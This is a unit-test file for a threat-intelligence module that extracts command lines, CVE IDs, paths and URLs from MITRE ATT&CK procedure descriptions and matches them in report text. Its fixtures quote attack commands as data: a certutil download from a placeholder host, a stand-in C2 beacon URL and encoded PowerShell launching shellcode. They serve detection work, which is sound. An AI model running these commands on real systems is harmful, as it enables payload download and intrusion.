"""Unit tests for app.services.procedure_matcher.

Pure-function tests with no DB / STIX / LLM dependencies. Run anywhere.

    docker compose exec -T api python -m pytest tests/test_procedure_matcher.py -v
"""

from __future__ import annotations

from types import SimpleNamespace

from app.services.procedure_matcher import (
    MAX_TECHNIQUES_PER_STRING,
    build_index,
    extract_operative_strings,
    match_chunk,
)


# =============================================================================
# extract_operative_strings — pattern coverage
# =============================================================================


def test_extracts_backtick_wrapped_command():
    desc = "APT41 has used `certutil.exe -urlcache -split -f http://x.com/p` to download payloads."
    result = extract_operative_strings(desc)
    assert any("certutil.exe -urlcache -split -f" in s for s in result)


def test_extracts_cve_id():
    desc = "Exploited CVE-2024-3400 to gain initial access."
    result = extract_operative_strings(desc)
    assert "cve-2024-3400" in result


def test_extracts_windows_path():
    desc = "Created scheduled task at C:\\Windows\\System32\\Tasks\\Updater"
    result = extract_operative_strings(desc)
    assert any("c:\\windows" in s for s in result)


def test_extracts_url():
    desc = "Beacon to https://malicious-actor.example.com/c2/abc"
    result = extract_operative_strings(desc)
    assert any("malicious-actor.example.com" in s for s in result)


def test_returns_empty_for_plain_prose():
    desc = "The threat actor downloaded a malicious payload from a remote server."
    result = extract_operative_strings(desc)
    assert result == []


def test_returns_empty_for_none_input():
    assert extract_operative_strings(None) == []
    assert extract_operative_strings("") == []


def test_filters_below_min_length():
    # 'cmd.exe' is 7 chars after normalize, below MIN_LENGTH=8
    desc = "Used `cmd.exe`"
    result = extract_operative_strings(desc)
    assert "cmd.exe" not in result


def test_filters_alpha_only_no_punct_no_digit():
    # Long alpha-only string in backticks — fails char-class filter
    desc = "The actor used `someverylongalphastring` here."
    result = extract_operative_strings(desc)
    assert "someverylongalphastring" not in result
    # Verify the contract: every kept string contains a special char or digit
    for s in result:
        assert any(c in ".\\/-:" or c.isdigit() for c in s), \
            f"kept substring without special/digit: {s!r}"


def test_filters_mitre_self_reference_urls():
    desc = "See https://attack.mitre.org/techniques/t1059 for citation context."
    result = extract_operative_strings(desc)
    assert all("attack.mitre.org" not in s for s in result)


def test_filters_attack_techniques_path_fragment():
    # The Unix-path regex would catch '/techniques/t1059' even after stripping
    # the host. Blacklist must filter it out.
    desc = "Citation path: /techniques/t1059 here."
    result = extract_operative_strings(desc)
    assert all("/techniques/t" not in s for s in result)


def test_normalizes_whitespace():
    desc = "Run `tool.exe   --flag    -arg`"
    result = extract_operative_strings(desc)
    # Whitespace runs collapsed to single space
    assert "tool.exe --flag -arg" in result


def test_normalizes_to_lowercase():
    desc = "Run `Tool.EXE --Flag -Arg`"
    result = extract_operative_strings(desc)
    assert "tool.exe --flag -arg" in result


# =============================================================================
# build_index — aggregation behavior
# =============================================================================


def _stub_attack_data(examples):
    """Minimal stub that has get_procedure_examples()."""
    return SimpleNamespace(get_procedure_examples=lambda: examples)


def _example(tid, actor, atype, description):
    return {
        "technique_id": tid,
        "technique_stix_id": f"attack-pattern--{tid}",
        "source_actor_name": actor,
        "source_actor_type": atype,
        "description": description,
    }


def test_build_index_dedupes_entries_within_substring():
    # Same (tid, actor, atype) reported in two examples with the same substring.
    examples = [
        _example("T1059.001", "APT1", "intrusion-set",
                 "APT1 used `powershell.exe -EncodedCommand` once"),
        _example("T1059.001", "APT1", "intrusion-set",
                 "APT1 used `powershell.exe -EncodedCommand` again"),
    ]
    index = build_index(_stub_attack_data(examples))
    candidates = [
        entries for substr, entries in index.items()
        if "powershell.exe -encodedcommand" in substr
    ]
    assert candidates, "expected substring to be indexed"
    assert len(candidates[0]) == 1, \
        f"expected single deduped entry, got {len(candidates[0])}"


def test_build_index_drops_strings_above_max_techniques():
    # Substring appears across MAX_TECHNIQUES_PER_STRING + 1 distinct techniques.
    n = MAX_TECHNIQUES_PER_STRING + 1
    examples = [
        _example(f"T100{i}", f"Actor{i}", "intrusion-set",
                 "Used `verylongtoolname.exe -arg` here")
        for i in range(n)
    ]
    index = build_index(_stub_attack_data(examples))
    assert all("verylongtoolname.exe" not in substr for substr in index), \
        "string mapping to >MAX_TECHNIQUES should be dropped"


def test_build_index_keeps_strings_at_max_techniques():
    # Substring appears across EXACTLY MAX_TECHNIQUES_PER_STRING techniques.
    n = MAX_TECHNIQUES_PER_STRING
    examples = [
        _example(f"T100{i}", f"Actor{i}", "intrusion-set",
                 "Used `tool-with-args.exe -arg` here")
        for i in range(n)
    ]
    index = build_index(_stub_attack_data(examples))
    matches = [substr for substr in index if "tool-with-args.exe" in substr]
    assert matches, "string at exactly MAX_TECHNIQUES should be kept"


# =============================================================================
# match_chunk
# =============================================================================


def _entry(tid, actor="ActorX", atype="intrusion-set"):
    return {
        "technique_id": tid,
        "source_actor_name": actor,
        "source_actor_type": atype,
    }


def test_match_chunk_simple_positive():
    index = {"powershell.exe -encodedcommand": [_entry("T1059.001", "APT1")]}
    chunk = "The attacker ran powershell.exe -EncodedCommand to launch shellcode."
    matches = match_chunk(chunk, index)
    assert len(matches) == 1
    assert matches[0]["technique_id"] == "T1059.001"
    assert matches[0]["matched_substring"] == "powershell.exe -encodedcommand"
    assert matches[0]["source_actor_name"] == "APT1"


def test_match_chunk_case_insensitive():
    index = {"powershell.exe -encodedcommand": [_entry("T1059.001")]}
    chunk = "Saw POWERSHELL.EXE -EncodedCommand in process tree"
    matches = match_chunk(chunk, index)
    assert len(matches) == 1


def test_match_chunk_whitespace_normalized():
    index = {"powershell.exe -encodedcommand": [_entry("T1059.001")]}
    chunk = "Process tree:\n   powershell.exe   -EncodedCommand   {payload}"
    matches = match_chunk(chunk, index)
    assert len(matches) == 1


def test_match_chunk_empty_returns_empty():
    index = {"foo.exe -bar": [_entry("T1")]}
    assert match_chunk("", index) == []
    assert match_chunk(None, index) == []


def test_match_chunk_no_match_returns_empty():
    index = {"foo.exe -bar": [_entry("T1")]}
    chunk = "The chunk has nothing in common with the index."
    assert match_chunk(chunk, index) == []


def test_match_chunk_dedupes_same_technique_substring_pair():
    # Same substring maps to (T1, ActorA) AND (T1, ActorB) — same technique
    index = {
        "tool.exe -arg": [
            _entry("T1059.001", "ActorA", "intrusion-set"),
            _entry("T1059.001", "ActorB", "malware"),
        ],
    }
    chunk = "Saw tool.exe -arg in the report"
    matches = match_chunk(chunk, index)
    assert len(matches) == 1
    assert matches[0]["technique_id"] == "T1059.001"


def test_match_chunk_returns_separate_entries_per_technique():
    # Same substring maps to T1 AND T2 — different techniques
    index = {
        "tool.exe -arg": [
            _entry("T1059.001", "ActorA"),
            _entry("T1140", "ActorB"),
        ],
    }
    chunk = "Saw tool.exe -arg in the report"
    matches = match_chunk(chunk, index)
    assert len(matches) == 2
    assert {m["technique_id"] for m in matches} == {"T1059.001", "T1140"}
